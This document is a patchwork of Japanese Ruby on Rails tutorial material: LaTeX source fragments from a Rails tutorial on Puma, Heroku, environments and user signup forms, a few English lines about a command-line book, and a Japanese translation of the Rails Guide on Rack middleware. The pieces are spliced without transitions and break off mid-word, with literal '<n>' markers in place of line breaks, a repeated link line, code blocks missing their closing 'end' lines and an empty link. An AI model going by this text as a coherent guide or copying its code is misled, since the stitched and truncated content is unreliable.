つまり、WEBrickは\href{https://devcenter.heroku.com/articles/ruby-default-web-server}{本番環境として適切なWebサーバではありません}。よって、今回は\href{https://devcenter.heroku.com/articles/rails-Puma}{WEBrickをPumaというWebサーバに置き換えてみます}。Pumaは多数のリクエストを捌くことに適したWebサーバです。
新しいWebサーバを追加するために、\href{https://devcenter.heroku.com/articles/rails-Puma}{Heroku内のPumaドキュメント} (英語) にしたがってセットアップしていきます。
\href{http://online.pragmaticstudio.com/}{Pragmatic Studio}: Mike ClarkとNicole Clarkが教鞭を執っているオンラインのRailsクラスです。
他にどんなコールバックがあるのか知りたい場合は、\href{http://api.rubyonrails.org/v4.2.0.rc2/classes/ActiveRecord/Callbacks.html}{Rails APIのコールバック} (英語) を読んでみてください。
一方、Userモデルの方では、\kode{has_many :microposts}と追加する必要があります。ここは自動的に生成されないので、手動で追加してください (リスト\ref{code:user_has_many_microposts})。
これはリスト\ref{code:log_out_method}で使用されていました。
  Loading development environment
  >> Rails.env
  => "development"
  >> Rails.env.development?
  => true
  >> Rails.env.test?
  => false
  $ rails console test
  Loading test environment
  => "test"
  $ rails server --environment production
  $ bundle exec rake db:migrate RAILS_ENV=production
  $ heroku run console
  Ruby console for yourapp.herokuapp.com
  => "production"
  >> Rails.env.production?
次の章では、この{0}第{1}1{/1}章{/0}で学んだことを基礎として、データベースを備えた\emph{toyアプリ}を製作し、Railsでどんなことができるかをさらに詳しく学びます。
他にどんなコールバックがあるのか知りたい場合は、\href{http://api.rubyonrails.org/v4.2.0.rc1/classes/ActiveRecord/Callbacks.html}{Rails APIのコールバック} (英語) を読んでみてください。
n{Using keyword arguments in the \kode{gravatar\_for} helper. \\ \filepath{app/helpers/users\_helper.rb}}<n>%= lang:ruby, options: "hl_lines": [4]<n>\begin{code}<n>module UsersHelper<n><n>  # Returns the Gravatar for the given user.<n>  def gravatar_for(user, size: 80)<n>    gravatar_id = Digest::MD5::hexdigest(user.email.downcase)<n>    gravatar_url = "https://secure.gravatar.com/avatar/#{gravatar_id}?s=#{size}"<n>    image_tag(gravatar_url, alt: user.name, class: "gravatar")<n>  end<n>end<n>\end{code}<n>\end{codelisting}<n><n>    % subsection a_gravatar_image (end)<n><n>  \section{ユーザー登録フォーム} % (fold)<n>  \label{sec:signup_form}<n><n>
ise' id='ex-ad9fd0'></span><n><n>\end{enumerate}<n><n><n>    % subsection signup_error_messages (end)<n><n><n>    \subsection{失敗時のテスト} % (fold)<n>    \label{sec:a_test_for_invalid_submission}<n><n>
 %><n><n>      <%= f.label :password %><n>      <%= f.password_field :password, class: 'form-control' %><n><n>      <%= f.label :password_confirmation, "Confirmation" %><n>      <%= f.password_field :password_confirmation, class: 'form-control' %><n><n>      <%= f.submit "Create my account", class: "btn btn-primary" %><n>    <% end %><n>  </div><n></div><n>\end{code}<n>\end{codelisting}<n><n>    % subsection a_test_for_invalid_submission (end)<n><n>  % section unsuccessful_signups (end)<n><n>  \section{ユーザー登録成功} % (fold)<n>  \label{sec:successful_signups}<n><n>
end{enumerate}<n><n>    % subsection the_flash (end)<n><n>    \subsection{実際のユーザー登録} % (fold)<n>    \label{sec:the_first_signup}<n><n>
nd %><n>      .<n>      .<n>      .<n></html><n>\end{code}<n>\end{codelisting}<n><n>% subsection a_test_for_valid_submission (end)<n><n>  \section{プロのデプロイ} % (fold)<n>  \label{sec:professional_grade_deployment}<n><n>
grade_deployment (end)<n><n>  \section{最後に} % (fold)<n>  \label{sec:sign_up_conclusion}<n><n>Being able to sign up users is a major milestone for our application.
\noindent \emph{Learn Enough Command Line to Be Dangerous} is an introduction to the command line for complete beginners, the first in a \href{http://learnenough.com/}{series of tutorials} designed to teach the common foundations of ``computer magic'' (Box~\ref{aside:computer_magic}) to as broad an audience as possible.
本書はソフトウェア開発者や、ソフトウェア開発者になりたい方々のために執筆されています。<n>
Unlike most introductions to the command line, which typically assume a relatively high level of technical sophistication, \emph{Learn Enough Command Line to Be Dangerous} assumes no prerequisites other than general computer knowledge (how to launch an application, how to use a web browser, how to \href{http://lmgtfy.com/?q=learn+to+touch+type}{touch type}, etc.).
Rails と Rack
=============
このガイドでは、RailsとRackの関係、Railsと他のRackコンポーネントとの関係について説明します。
* RackのミドルウェアをRailsで使う方法
* Action Pack内のミドルウェアスタックについて
* 独自のミドルウェアスタックを定義する方法
WARNING: このガイドはRackのミドルウェア、urlマップ、`Rack::Builder`といったRackのプロトコルや概念に関する実用的な知識があることを前提にしています。
Rack入門
Rackは、Rubyのウェブアプリケーションに対して、最小限でモジュール化されていて、応用の効くインターフェイスを提供します。
RackはHTTPリクエストとレスポンスを可能なかぎり簡単な方法でラッピングすることで、ウェブサーバー、ウェブフレームワーク、その間に位置するソフトウェア (ミドルウェアと呼ばれています) のAPIを一つのメソッド呼び出しの形にまとめます。
* [Rack API ドキュメンテーション](http://rack.github.io/)
Rackに関する解説はこのガイドの範疇を超えてしまいます。
Rackに関する基本的な知識が足らない場合、下記の[リソース](#参考資料) を参照してください。
RailsとRack
### RackアプリケーションとしてのRailsアプリケーション
`Rails.application`はRailsアプリケーションをRackアプリケーションとして実装したものです。
Rackに準拠したWebサーバーで、Railsアプリケーションを提供するには、`Rails.application`オブジェクトを使用する必要があります。
### `rails server`
`rails server`コマンドは`Rack::Server`のオブジェクトを作成し、ウェブサーバーを起動します。
`rails server`コマンドは以下のようにして、`Rack::Server`のオブジェクトを作成します。
Rails::Server.new.tap do |server|
  require APP_PATH
  Dir.chdir(Rails.application.root)
  server.start
`Rails::Server`クラスは`Rack::Server`クラスを継承しており、以下のようにして`Rack::Server#start`を呼び出します。
class Server < ::Rack::Server
  def start
    super
また次のようにして、ミドルウェアを読み込みます。
def middleware
  middlewares = []
  middlewares << [Rails::Rack::Debugger] if options[:debugger]
  middlewares << [::Rack::ContentLength]
  Hash.new(middlewares)
`Rails::Rack::Debugger`は主としてdevelopment環境で役に立ちます。
読み込まれたミドルウェアの役割は下表のとおりです。
| ミドルウェア              | 役割                                                                           |
| ----------------------- | --------------------------------------------------------------------------------- |
| `Rails::Rack::Debugger` | デバッガを起動する                                                                   |
Railsの`rails server`コマンドの代わりに`rackup`コマンドを使用するときは、下記の内容を`config.ru`に記述して、Railsアプリケーションのルートディレクトリに保存します。
# Rails.root/config.ru
require ::File.expand_path('../config/environment', __FILE__)
use Rack::ContentLength
run Rails.application
サーバーを起動します。
$ rackup config.ru
`rackup`のオプションについて詳しく知りたいときは下記のようにします。
$ rackup --help
Action Dispatcherのミドルウェアスタック
Action Dispatcher内部のコンポーネントの多くは、Rackのミドルウェアとして実装されています。
Rails内外の様々なミドルウェアを結合して、完全なRailsのRackアプリケーションを作るために、`Rails::Application`は`ActionDispatch::MiddlewareStack`を使用しています。
NOTE: `ActionDispatch::MiddlewareStack`は`Rack::Builder`のRails版ですが、Railsアプリケーションの要求を満たすために、より柔軟性があり、多機能なクラスになっています。
### ミドルウェアスタックを調べる
Railsにはミドルウェアスタックを調べるための便利なRakeタスクがあります。
作成したばかりのRailsアプリケーションでは、以下のように出力されるはずです。
use Rack::Sendfile
use ActionDispatch::Static
use Rack::Lock
use #<ActiveSupport::Cache::Strategy::LocalCache::Middleware:0x000000029a0838>
use Rack::Runtime
use Rack::MethodOverride
use ActionDispatch::RequestId
use Rails::Rack::Logger
use ActionDispatch::ShowExceptions
use ActionDispatch::DebugExceptions
use ActionDispatch::RemoteIp
use ActionDispatch::Reloader
use ActionDispatch::Callbacks
use ActiveRecord::Migration::CheckPending
use ActiveRecord::ConnectionAdapters::ConnectionManagement
use ActiveRecord::QueryCache
use ActionDispatch::Cookies
use ActionDispatch::Session::CookieStore
use ActionDispatch::Flash
use ActionDispatch::ParamsParser
use Rack::Head
use Rack::ConditionalGet
use Rack::ETag
run Rails.application.routes
デフォルトのミドルウェア(とその他のうちいくつか)については [Internal Middlewares](#ミドルウェアスタックの内容) を参照してください。
### ミドルウェアスタックを設定する
ミドルウェアスタックにミドルウェアを追加したり、削除したり、変更したりするには`application.rb`もしくは環境ごとの`environments/<environment>.rb`ファイル内で`config.middleware`をいじります。
#### ミドルウェアを追加する
次のメソッドを使用すると、ミドルウェアスタックに新しいミドルウェアを追加することができます。
* `config.middleware.use(new_middleware, args)` - ミドルウェアスタックの一番下に新しいミドルウェアを追加します。
* `config.middleware.insert_before(existing_middleware, new_middleware, args)` - (第一引数で)指定されたミドルウェアの前に新しいミドルウェアを追加します。
* `config.middleware.insert_after(existing_middleware, new_middleware, args)` - (第一引数で)指定されたミドルウェアの後に新しいミドルウェアを追加します。
# Rack::BounceFaviconを一番最後に追加する
config.middleware.use Rack::BounceFavicon
# またLifo::Cacheに{ page_cache: false }を渡す
config.middleware.insert_after ActiveRecord::QueryCache, Lifo::Cache, page_cache: false
#### ミドルウェアを交換する
`config.middleware.swap`を使用することで、ミドルウェアスタック内のミドルウェアを交換できます。
# ActionDispatch::ShowExceptionsをLifo::ShowExceptionsで置き換える
config.middleware.swap ActionDispatch::ShowExceptions, Lifo::ShowExceptions
#### ミドルウェアを削除する
アプリケーションの設定に、下記のコードを追加してください。
config.middleware.delete "Rack::Lock"
ミドルウェアスタックを調べると、`Rack::Lock`が消えていることが分かります。
(in /Users/lifo/Rails/blog)
use #<ActiveSupport::Cache::Strategy::LocalCache::Middleware:0x00000001c304c8>
セッション関連のミドルウェアを削除したいときは次のように書きます。
config.middleware.delete "ActionDispatch::Cookies"
config.middleware.delete "ActionDispatch::Session::CookieStore"
config.middleware.delete "ActionDispatch::Flash"
ブラウザ関連のミドルウェアを削除するには次のように書きます。
### ミドルウェアスタックの内容
Action Controllerの機能の多くはミドルウェアとして実装されています。
以下のリストでそれぞれの役割を説明します。
* X-Sendfile headerを設定します。
`config.action_dispatch.x_sendfile_header`オプション経由で設定を変更できます。
**`ActionDispatch::Static`**
* `env["rack.multithread"]`を`false`に設定し、アプリケーションをMutexで包みます。
**`ActiveSupport::Cache::Strategy::LocalCache::Middleware`**
* メモリによるキャッシュを行うために使用します。
このキャッシュはスレッドセーフではありません。
**`Rack::Runtime`**
* X-Runtimeヘッダーを生成します。このヘッダーにはリクエストの処理にかかった時間が秒単位で表示されます。
**`Rack::MethodOverride`**
* `params[:_method]`が存在するときに、(HTTPの)メソッドを上書きます。
HTTPのPUTメソッド、DELETEメソッドを実現するためのミドルウェアです。
**`ActionDispatch::RequestId`**
* ユニークなidを生成して`X-Request-Id`ヘッダーに設定します。`ActionDispatch::Request#uuid`メソッドも同一のidを利用しています。
**`Rails::Rack::Logger`**
* リクエストの処理を開始したことを、ログに書き出します。
**`ActionDispatch::ShowExceptions`**
* アプリケーションが返してくる例外を捕え、例外処理用のアプリケーションを起動します。例外処理用のアプリケーションは、エンドユーザー向けに例外を整形します。
**`ActionDispatch::DebugExceptions`**
* 例外をログに残し、ローカルからのリクエストの場合は、デバッグ用のページを表示します。
**`ActionDispatch::RemoteIp`**
* IPスプーフィング攻撃をチェックします。
**`ActionDispatch::Reloader`**
* development環境でコードの再読み込みを行うために、prepareコールバックとcleanupコールバックを提供します。
**`ActionDispatch::Callbacks`**
**`ActiveRecord::Migration::CheckPending`**
* 未実行のマイグレーションがないか確認します。未実行のものがあった場合は、`ActiveRecord::PendingMigrationError`を発生さます。
**`ActiveRecord::ConnectionAdapters::ConnectionManagement`**
* リクエストを処理する度にデータベースへのコネクションをコネクションプールに返します。`env['rack.test']` が `true`でない場合のみ返却が行われます。
**`ActiveRecord::QueryCache`**
* Active Recordのクエリキャッシュを有効にします。
**`ActionDispatch::Cookies`**
* クッキー機能を提供します。
**`ActionDispatch::Session::CookieStore`**
* クッキーにセッションを保存するようにします。
**`ActionDispatch::Flash`**
* flash機能を提供します(flashとは連続するリクエスト間で値を共有する機能です)。
**`ActionDispatch::ParamsParser`**
* リクエストからパラメータをパースして、`params`を設定します。
* HEADリクエストを`GET`に変換して処理します。その上でbodyを空にしたレスポンスを返します(訳注: Rails4.0からはRack::Headを使うように変更されています)。
**`Rack::ConditionalGet`**
* "条件付き `GET`" (Conditional `GET`) 機能を提供します。"条件付き `GET`"が有効になっていると、リクエストされたページに変更がないときに空のbodyを返すようになります。
**`Rack::ETag`**
* bodyが文字列のみのレスポンスに対して、ETagヘッダを追加します。 
ETagはキャッシュの有効性を検証するのに使用されます。
TIP: これらのミドルウェアはいずれも、Rackのミドルウェアスタックに利用できます。
参考資料
### Rackについて詳しく学ぶ
* [Rack公式サイト](http://rack.github.io)
* [Rack入門](http://chneukirchen.org/blog/archive/2007/02/introducing-rack.html)
* [Ruby on Rack #1 - Hello Rack!](
* [Ruby on Rack #2 - The Builder](http://m.onkey.org/ruby-on-rack-2-the-builder)
### ミドルウェアを理解する
* [Railscast on Rack Middlewares](http://railscasts.com/episodes/151-rack-middleware)
